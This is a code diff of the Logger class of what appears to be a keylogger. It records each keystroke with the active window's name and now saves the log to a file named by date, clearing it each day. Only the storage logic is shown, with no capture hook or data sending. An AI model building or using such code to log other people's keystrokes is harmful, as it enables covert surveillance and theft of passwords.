@@ -2,18 +2,9 @@
 #include "Logger.h"
 
 // Logger(string) : Constructor of the Logger class
-Logger::Logger(string path)
+Logger::Logger()
 {
-	this->SetPath(path);
-}
-
-// Logger(string, bool) : Constructor of the Logger class
-Logger::Logger(string path, bool load)
-{
-	this->SetPath(path);
-
-	if (load)
-		this->LoadMapFromFile();
+	this->SetDate(Utilities::GetCurrentDate());
 }
 
 // Insert(string, string) : Insert into map the key stroke on the window
@@ -34,6 +25,9 @@ void Logger::Insert(string window_name, int key_input)
 // Add(string, int) : Add key stroke and the window name to Logger
 void Logger::Add(string window_name, int key_stroke)
 {
+	// Make sure log is up to date befre adding anything
+	this->UpdateLog();
+
 	// Check if key stroke is mapped if not map_key == "" 
 	string map_key = Keys.Map[key_stroke];
 
@@ -52,6 +46,23 @@ void Logger::Add(string window_name, int key_stroke)
 	else
 	{		
 		this->Insert(window_name, map_key);
+	}
+}
+
+// UpdateLog() : Update the log date and save and clean log when date change
+void Logger::UpdateLog()
+{
+	// If current date is different than log date
+	if (this->GetDate() != Utilities::GetCurrentDate())
+	{
+		// Save log to file with the old date as file name
+		this->SaveMapToFile();
+
+		// Clear map log
+		this->Log.clear();
+
+		// Update the log date
+		this->SetDate(Utilities::GetCurrentDate());
 	}
 }
 
@@ -76,22 +87,22 @@ string Logger::GetLog()
 }
 
 // GetPath() : Return the path to the log file
-string Logger::GetPath() const
+string Logger::GetDate() const
 {
-	return this->Path;
+	return this->Date;
 }
 
 // SetPath(string) :  Set the path of the log file
-void Logger::SetPath(string path)
+void Logger::SetDate(string date)
 {
-	this->Path = path;
+	this->Date = date;
 }
 
 // SaveMapToFile() : Save Map content to file
 void Logger::SaveMapToFile()
 {
 	// Initiate file stream and map iterator
-	ofstream file(this->Path);
+	ofstream file(this->Date + ".log");
 	map<string, string>::iterator iter;
 
 	// Go through all map log and write it to file
@@ -108,7 +119,7 @@ void Logger::SaveMapToFile()
 // LoadMapFromFile() : Load file content to map
 bool Logger::LoadMapFromFile()
 {
-	ifstream file(this->Path);
+	ifstream file(this->Date + ".log");
 
 	// Make sure file exist
 	if (!file)
